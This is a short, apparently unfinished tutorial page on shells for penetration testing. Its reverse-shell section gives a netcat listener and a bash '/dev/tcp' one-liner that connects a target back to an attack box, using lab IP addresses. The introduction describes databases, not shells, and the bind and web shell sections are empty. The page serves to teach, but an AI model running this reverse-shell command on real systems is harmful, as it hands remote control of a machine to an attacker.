# Shell

- [Introduction](#introduction)
- [Reverse Shell](#reverse-shell)
- [Bind Shell](#bind-shell)
- [Web Shell](#web-shell)

## Introduction

Databases are where information is stored. They store information like users, products, shopping carts, shipments, customers, clients and payment information. When people talk about hackers getting people's information they are talking about how hackers took that information from a database.

For the purposes of this section, my attack box is at ip address `10.10.1.10` and my target box is at ip address `10.10.1.20`.

## Reverse Shell

A reverse shell is when a target machine initiates a connection back to a listening port on the attack machine. The attack machine will start by listening on a port. The target machine will then call out to the attack machine on that port. Once this happens, the attack machine can now run commands on the target machine.

The attack box will listen on a port and wait for a connection. Here is a netcat example where the attack box listens on port 4444:

```bash
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
```

The target machine will then send a connection to the listening port of the attack machine:

```bash
$ bash -i >& /dev/tcp/10.10.1.10/4444 0>&1
```

This will cause the listener to get a message like the following (the port number at the end will most likely be different):

```bash
Connection received on 10.10.1.20 42164
```

## Bind Shell

## Web Shell
